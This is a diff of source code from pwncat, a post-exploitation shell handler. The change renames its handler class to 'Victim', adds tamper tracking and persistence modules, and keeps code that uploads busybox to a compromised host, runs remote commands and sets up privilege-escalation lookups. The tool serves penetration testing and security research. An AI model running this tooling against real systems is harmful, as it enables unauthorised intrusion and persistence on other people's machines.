@@ -1,159 +1,27 @@
 #!/usr/bin/env python3
-from typing import Dict, Optional, Iterable, IO, Callable, Any
-from prompt_toolkit import PromptSession, ANSI
-from prompt_toolkit.shortcuts import ProgressBar
-from prompt_toolkit.completion import (
-    Completer,
-    PathCompleter,
-    Completion,
-    CompleteEvent,
-    NestedCompleter,
-    WordCompleter,
-    merge_completers,
-)
-from prompt_toolkit.document import Document
-from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
-from prompt_toolkit.lexers import PygmentsLexer
-from functools import wraps
-import subprocess
-import traceback
-import requests
-import tempfile
-import logging
-import argparse
-import base64
-import time
-import socket
-import enum
-import shlex
-import sys
-import os
-import re
 import io
+import os
+import shlex
+import socket
+import sys
+import time
+from typing import Dict, Optional, IO, Any, List, Tuple
 
-from pwncat.util import State
-from pwncat import util
-from pwncat import downloader, uploader, privesc
-from pwncat.file import RemoteBinaryPipe
-from pwncat.lexer import LocalCommandLexer, PwncatStyle
-from pwncat.gtfobins import GTFOBins, Capability, Stream
-from pwncat.commands import CommandParser
-from pwncat.config import Config, KeyType
-
+import requests
 from colorama import Fore
 
-
-def with_parser(f):
-    @wraps(f)
-    def _decorator(self, argv):
-        try:
-            parser = getattr(self, f.__name__.split("do_")[1] + "_parser")
-            args = parser.parse_args(argv)
-        except SystemExit:
-            return
-        return f(self, args)
-
-    return _decorator
+from pwncat import privesc
+from pwncat import persist
+from pwncat import util
+from pwncat.commands import CommandParser
+from pwncat.config import Config, KeyType
+from pwncat.file import RemoteBinaryPipe
+from pwncat.gtfobins import GTFOBins, Capability, Stream
+from pwncat.tamper import Tamper, TamperManager
+from pwncat.util import State
 
 
-class RemotePathCompleter(Completer):
-    def __init__(self, pty: "PtyHandler"):
-        self.pty = pty
-
-    def get_completions(self, document: Document, complete_event: CompleteEvent):
-
-        before = document.text_before_cursor.split()[-1]
-        path, partial_name = os.path.split(before)
-
-        if path == "":
-            path = "."
-
-        delim = self.pty.process(f"ls -1 -a {shlex.quote(path)}", delim=True)
-
-        name = self.pty.recvuntil(b"\n").strip()
-        while name != delim:
-            name = name.decode("utf-8")
-            if name.startswith(partial_name):
-                yield Completion(
-                    name,
-                    start_position=-len(partial_name),
-                    display=[("#ff0000", "(remote)"), ("", f" {name}")],
-                )
-            name = self.pty.recvuntil(b"\n").strip()
-
-
-class LocalPathCompleter(Completer):
-    def __init__(self, pty: "PtyHandler"):
-        self.pty = pty
-
-    def get_completions(self, document: Document, complete_event: CompleteEvent):
-
-        before = document.text_before_cursor.split()[-1]
-        path, partial_name = os.path.split(before)
-
-        if path == "":
-            path = "."
-
-        # Ensure the directory exists
-        if not os.path.isdir(path):
-            return
-
-        for name in os.listdir(path):
-            if name.startswith(partial_name):
-                yield Completion(
-                    name,
-                    start_position=-len(partial_name),
-                    display=[("fg:ansiyellow", "(local)"), ("", f" {name}")],
-                )
-
-
-class CommandCompleter(Completer):
-    def __init__(self, description):
-        self.description = description
-
-    def get_completions(
-        self, document: Document, complete_event: CompleteEvent
-    ) -> Iterable[Completion]:
-        # Split document.
-        text = document.text_before_cursor.lstrip()
-        stripped_len = len(document.text_before_cursor) - len(text)
-        prev_term: Optional[str]
-
-        # If there is a space, check for the first term, and use a
-        # subcompleter.
-        if " " in text:
-            first_term = text.split()[0]
-            command = self.description.get(first_term)
-
-            # If we have a sub completer, use this for the completions.
-            if command is not None:
-                options = [k for k in command if k != "positional"]
-                terms = text.split(" ")
-
-                if len(terms) > 2:
-                    prev_term = terms[-2]
-                else:
-                    prev_term = None
-
-                if prev_term in options:
-                    completer = command[prev_term]
-                else:
-                    positionals = command.get("positional", [])
-                    completer = merge_completers(
-                        [WordCompleter(options, ignore_case=False)] + positionals
-                    )
-
-                for c in completer.get_completions(document, complete_event):
-                    yield c
-
-        # No space in the input: behave exactly like `WordCompleter`.
-        else:
-            completer = WordCompleter(list(self.description.keys()), ignore_case=False)
-            for c in completer.get_completions(document, complete_event):
-                yield c
-
-
-class PtyHandler:
+class Victim:
     """ Handles creating the pty on the remote end and locally processing input
     on the local end """
 
@@ -180,13 +48,12 @@ class PtyHandler:
         "script",
     ]
 
-    def __init__(self, client: socket.SocketType, config_path: str):
+    def __init__(self, config_path: str):
         """ Initialize a new Pty Handler. This will handle creating the PTY and
         setting the local terminal to raw. It also maintains the state to open a
         local terminal if requested and exit raw mode. """
 
         self.config = Config(self)
-        self.client = client
         self._state = State.COMMAND
         self.saved_term_state = None
         self.input = b""
@@ -199,9 +66,9 @@ class PtyHandler:
             "\\[\\033[01;33m\\]\\u@\\h\\[\\033[00m\\]:\\["
             "\\033[01;36m\\]\\w\\[\\033[00m\\]\\$ "
         )
-        self.prompt = self.build_prompt_session()
         self.has_busybox = False
         self.busybox_path: Optional[str] = None
+        self.busybox_provides: List[str] = []
         self.binary_aliases = {
             "python": [
                 "python2",
@@ -217,62 +84,21 @@ class PtyHandler:
         self.gtfo: GTFOBins = GTFOBins("data/gtfobins.json", self.which)
         self.default_privkey = "./data/pwncat"
         self.has_prefix = False
-        self.command_parser = CommandParser(self)
+        self.command_parser: CommandParser = CommandParser()
+        self.tamper: TamperManager = TamperManager()
+        self.client: Optional[socket.SocketType] = None
+        self.arch: str = "unknown"
+        self.shell: str = "unknown"
+        self.privesc: privesc.Finder = None
+        self.persist: persist.Persistence = persist.Persistence()
 
-        # Run the configuration script
-        with open(config_path, "r") as filp:
-            config_script = filp.read()
-        self.command_parser.eval(config_script, config_path)
+    def connect(self, client: socket.SocketType):
+
+        # Initialize the socket connection
+        self.client = client
 
         # We should always get a response within 3 seconds...
         self.client.settimeout(1)
-
-        util.info("probing for prompt...", overlay=True)
-        start = time.time()
-        prompt = b""
-        try:
-            while time.time() < (start + 0.1):
-                prompt += self.client.recv(1)
-        except socket.timeout:
-            pass
-
-        # We assume if we got data before sending data, there is a prompt
-        if prompt != b"":
-            self.has_prompt = True
-            util.info(f"found a prompt", overlay=True)
-        else:
-            self.has_prompt = False
-            util.info("no prompt observed", overlay=True)
-
-        # Send commands without a new line, and see if the characters are echoed
-        util.info("checking for echoing", overlay=True)
-        test_cmd = b"echo"
-        self.client.send(test_cmd)
-        response = b""
-
-        try:
-            while len(response) < len(test_cmd):
-                response += self.client.recv(len(test_cmd) - len(response))
-        except socket.timeout:
-            pass
-
-        if response == test_cmd:
-            self.has_echo = True
-            util.info("found input echo", overlay=True)
-        else:
-            self.has_echo = False
-            util.info(f"no echo observed", overlay=True)
-
-        self.client.send(b"\n")
-        response = self.client.recv(1)
-        if response == "\r":
-            self.client.recv(1)
-            self.has_cr = True
-        else:
-            self.has_cr = False
-
-        if self.has_echo:
-            self.recvuntil(b"\n")
 
         # Attempt to identify architecture
         self.arch = self.run("uname -m").decode("utf-8").strip()
@@ -295,7 +121,7 @@ class PtyHandler:
         # The auto-resolving doesn't work correctly until we have a pty
         # so, we manually resolve a list of useful binaries prior to spawning
         # a pty
-        for name in PtyHandler.INTERESTING_BINARIES:
+        for name in Victim.INTERESTING_BINARIES:
             util.info(
                 f"resolving remote binary: {Fore.YELLOW}{name}{Fore.RESET}",
                 overlay=True,
@@ -311,7 +137,7 @@ class PtyHandler:
         # Now, we can resolve using `which` w/ request=False for the different
         # methods
         if self.which("python") is not None:
-            method_cmd = PtyHandler.OPEN_METHODS["python"].format(
+            method_cmd = Victim.OPEN_METHODS["python"].format(
                 self.which("python"), self.shell
             )
             method = "python"
@@ -335,11 +161,6 @@ class PtyHandler:
         self.run(method_cmd, wait=False)
         # client.sendall(method_cmd.encode("utf-8") + b"\n")
 
-        # We just started a PTY, so we now have all three
-        self.has_echo = True
-        self.has_cr = True
-        self.has_prompt = True
-
         util.info("setting terminal prompt", overlay=True)
         self.run("unset PROMPT_COMMAND")
         self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')
@@ -351,7 +172,7 @@ class PtyHandler:
         # Disable automatic margins, which fuck up the prompt
         self.run("tput rmam")
 
-        self.privesc = privesc.Finder(self)
+        self.privesc = privesc.Finder()
 
         # Save our terminal state
         self.stty_saved = self.run("stty -g").decode("utf-8").strip()
@@ -392,7 +213,7 @@ class PtyHandler:
                 util.warn(f"no busybox for architecture: {self.arch}")
                 return
 
-            # Grab the content length if provided
+            # Grab the original_content length if provided
             length = r.headers.get("Content-Length", None)
             if length is not None:
                 length = int(length)
@@ -405,7 +226,7 @@ class PtyHandler:
             # Open the remote file for writing
             with self.open(busybox_remote_path, "wb", length=length) as filp:
 
-                # Local function for transferring the content
+                # Local function for transferring the original_content
                 def transfer(on_progress):
                     for chunk in r.iter_content(chunk_size=1024 * 1024):
                         filp.write(chunk)
@@ -418,6 +239,15 @@ class PtyHandler:
 
             # Make busybox executable
             self.run(f"chmod +x {shlex.quote(busybox_remote_path)}")
+
+            # Custom tamper to remove busybox and stop tracking it here
+            self.tamper.custom(
+                (
+                    f"{Fore.RED}installed{Fore.RESET} {Fore.GREEN}busybox{Fore.RESET} "
+                    f"to {Fore.CYAN}{busybox_remote_path}{Fore.RESET}"
+                ),
+                self.remove_busybox,
+            )
 
             util.success(
                 f"uploaded busybox to {Fore.GREEN}{busybox_remote_path}{Fore.RESET}"
@@ -467,48 +297,13 @@ class PtyHandler:
         self.has_busybox = True
         self.busybox_path = busybox_remote_path
 
-    def build_prompt_session(self):
-        """ This is kind of gross because of the nested completer, so I broke
-        it out on it's own. The nested completer must be updated separately
-        whenever a new command or a command argument is changed. """
+    def remove_busybox(self):
+        """ Remove the busybox installation """
 
-        remote_completer = RemotePathCompleter(self)
-        local_completer = LocalPathCompleter(self)
-        download_method_completer = WordCompleter(downloader.get_names())
-        upload_method_completer = WordCompleter(uploader.get_names())
+        self.has_busybox = False
+        self.busybox_provides = []
 
-        completer_graph = {
-            "download": {
-                "-m": download_method_completer,
-                "--method": download_method_completer,
-                "-o": local_completer,
-                "--output": local_completer,
-                "positional": [remote_completer],
-            },
-            "upload": {
-                "-m": upload_method_completer,
-                "--method": upload_method_completer,
-                "-o": remote_completer,
-                "--output": remote_completer,
-                "positional": [local_completer],
-            },
-            "back": None,
-            "sync": None,
-            "help": None,
-        }
-
-        return PromptSession(
-            [
-                ("fg:ansiyellow bold", "(local) "),
-                ("fg:ansimagenta bold", "pwncat"),
-                ("", "$ "),
-            ],
-            completer=CommandCompleter(completer_graph),
-            auto_suggest=AutoSuggestFromHistory(),
-            lexer=PygmentsLexer(LocalCommandLexer),
-            style=PwncatStyle,
-            complete_while_typing=False,
-        )
+        self.run(f"rm -f {self.busybox_path}")
 
     def which(self, name: str, request=True, quote=False) -> Optional[str]:
         """ Call which on the remote host and return the path. The results are
@@ -638,10 +433,12 @@ class PtyHandler:
         """ Save the local terminal state """
         util.restore_terminal(self.saved_term_state)
 
-    def run(self, cmd, wait=True, input: bytes = b"") -> bytes:
+    def run(self, cmd, wait: bool = True, input: bytes = b"") -> bytes:
         """ Run a command in the context of the remote host and return the
         output. This is run synchrounously.
 
+            :param input: The input to automatically pass to the new process
+            :param wait: Whether to wait for process completion
             :param cmd: The command to run. Either a string or an argv list.
             :param has_pty: Whether a pty was spawned
         """
@@ -650,7 +447,7 @@ class PtyHandler:
 
         if wait:
 
-            response = self.recvuntil(edelim)
+            response = self.recvuntil(edelim.encode("utf-8"))
             response = response.split(edelim.encode("utf-8"))[0]
             if sdelim.encode("utf-8") in response:
                 response = b"\n".join(response.split(b"\n")[1:])
@@ -666,7 +463,7 @@ class PtyHandler:
 
         return response
 
-    def process(self, cmd, delim=True) -> bytes:
+    def process(self, cmd, delim=True) -> Tuple[str, str]:
         """ Run a command in the context of the remote host and return the
         output. This is run synchrounously.
 
@@ -685,17 +482,12 @@ class PtyHandler:
         else:
             command = f" {cmd}"
 
-        response = b""
-        eol = b"\r"
-        if self.has_cr:
-            eol = b"\r"
-
         # Send the command to the remote host
         self.client.send(command.encode("utf-8") + b"\n")
 
         if delim:
             # Receive until we get our starting delimeter on a line by itself
-            while not self.recvuntil("\n").startswith(sdelim.encode("utf-8")):
+            while not self.recvuntil(b"\n").startswith(sdelim.encode("utf-8")):
                 pass
 
         return sdelim, edelim
@@ -1093,6 +885,7 @@ class PtyHandler:
         self.run("reset", wait=False)
         self.has_cr = True
         self.has_echo = True
+        self.run("unset PROMPT_COMMAND")
         self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
         self.run(f"tput rmam")
 
@@ -1171,6 +964,10 @@ class PtyHandler:
 
     @property
     def users(self):
+
+        if self.client is None:
+            return {}
+
         if self.known_users:
             return self.known_users
 
